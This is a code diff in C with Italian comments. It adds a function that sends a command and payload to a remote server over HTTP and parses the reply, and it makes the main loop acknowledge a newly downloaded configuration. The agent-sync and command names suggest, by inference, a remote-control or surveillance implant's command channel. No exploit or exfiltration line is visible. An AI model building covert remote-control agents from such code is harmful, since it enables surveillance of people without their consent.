@@ -937,6 +937,49 @@ BOOL H_ASP_GenericCommand(DWORD command, DWORD *response_command, BYTE **respons
 	return ret_val;
 }
 
+// Usato per i comandi che ricevono un buffer in memoria (DOWNLOAD e FILESYSTEM)
+// Se il server torna un messaggio, response_message viene allocato (va liberato dal chiamante)
+// Permette anche l'invio di un payload
+BOOL H_ASP_GenericCommandPL(DWORD command, BYTE *payload, DWORD payload_len, DWORD *response_command, BYTE **response_message, DWORD *response_message_len)
+{
+	BYTE *response = NULL; 
+	DWORD response_len;
+	DWORD buffer_len;
+	BYTE *buffer = NULL;
+	BOOL ret_val = FALSE;
+	BYTE *ptr = NULL;
+
+	*response_message = NULL;
+	*response_message_len = 0;
+	*response_command = PROTO_NO;
+
+	do {
+		// Crea il comando
+		if (!(buffer = PreapareCommand(command, payload, payload_len, &buffer_len)))
+			break;
+
+		// Invia il buffer
+		if (!HttpTransaction(buffer, buffer_len, &response, &response_len, WIRESPEED)) 
+			break;
+
+		// Parsa la risposta
+		if (!(ptr = ParseResponse(response, response_len, response_command, response_message_len)))
+			break;
+
+		if (*response_command == PROTO_OK && *response_message_len > 0) {
+			// Passa al chiamante il messaggio ritornato
+			if (! (*response_message = (BYTE *)malloc(*response_message_len)))
+				break;
+			memcpy(*response_message, ptr, *response_message_len);
+		} 
+		ret_val = TRUE;
+	} while(0);
+
+	SAFE_FREE(buffer);
+	SAFE_FREE(response);
+	return ret_val;
+}
+
 #define MINIMAL_UPLOAD_PACKET_LEN 14
 // Se torna PROTO_OK scrive il file che ha scaricato e ne torna il nome in file_name (che va liberato)
 // Non viene usato GenericCommand per evitare di dover allocare due volte tutta la memoria per il file
@@ -1126,8 +1169,12 @@ void __stdcall  ASP_MainLoop(char *asp_server)
 		} else if (ASP_IPC_command->action == ASP_NCONF) {
 			asp_request_conf *rc = (asp_request_conf *)ASP_IPC_command->in_param;
 			ret_success = H_ASP_GenericCommand(PROTO_NEW_CONF, &ASP_IPC_command->out_command, &message, &msg_len);
-			if (ret_success && ASP_IPC_command->out_command == PROTO_OK) 
+			if (ret_success && ASP_IPC_command->out_command == PROTO_OK) {
+				DWORD proto_ok = PROTO_OK;
 				WriteBufferOnFile(rc->conf_path, message, msg_len);
+				SAFE_FREE(message);	
+				H_ASP_GenericCommandPL(PROTO_NEW_CONF, (BYTE *)&proto_ok, sizeof(DWORD), &ASP_IPC_command->out_command, &message, &msg_len);
+			}
 			SAFE_FREE(message);	
 
 		} else if (ASP_IPC_command->action == ASP_DOWN) {
